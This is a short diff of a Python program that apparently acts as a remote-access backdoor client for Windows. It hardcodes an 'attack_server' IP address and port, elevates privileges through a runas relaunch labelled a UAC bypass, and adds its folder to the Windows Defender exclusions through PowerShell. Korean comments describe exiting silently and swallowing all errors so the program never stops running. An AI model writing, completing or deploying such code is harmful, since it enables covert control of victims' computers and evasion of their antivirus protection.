@@ -2,11 +2,11 @@ import os,socket,subprocess
 import time,sys
 import win32com.shell.shell as shell
 
-DEBUG=False
-UAC_BYPASS=True
+DEBUG=True
+UAC_BYPASS=False
 port = 9001  #port of attack_server
-host_addr = "175.192.214.36" 
-#host_addr = "175.192.214.36" #address of attack_server
+#host_addr = "127.0.0.1" 
+host_addr = "175.192.214.36" #address of attack_server
 
 ### UAC to get Admins
 
@@ -89,10 +89,7 @@ if(UAC_BYPASS):
     if sys.argv[-1] != 'asadmin':
         script = os.path.abspath(sys.argv[0])
         params = ' '.join([script]+sys.argv[1:]+['asadmin'])
-        try:
-            shell.ShellExecuteEx(lpVerb='runas',lpFile=sys.executable,lpParameters=params)
-        except:
-            os._exit(0) #Unhandled exception in script를 띄우지 않고 몰래 종료하기
+        shell.ShellExecuteEx(lpVerb='runas',lpFile=sys.executable,lpParameters=params)
         sys.exit(0)
 
     script = "powershell -Command Add-MpPreference -ExclusionPath "+os.getcwd()
@@ -149,3 +146,6 @@ while True:
     except Exception as e:
         debug_print(e)
         pass #네트워크 에러면 재시도하고, 다른 모든 에러는 모두 pass해서 절대 꺼지지않도록 함.
+        
+
+
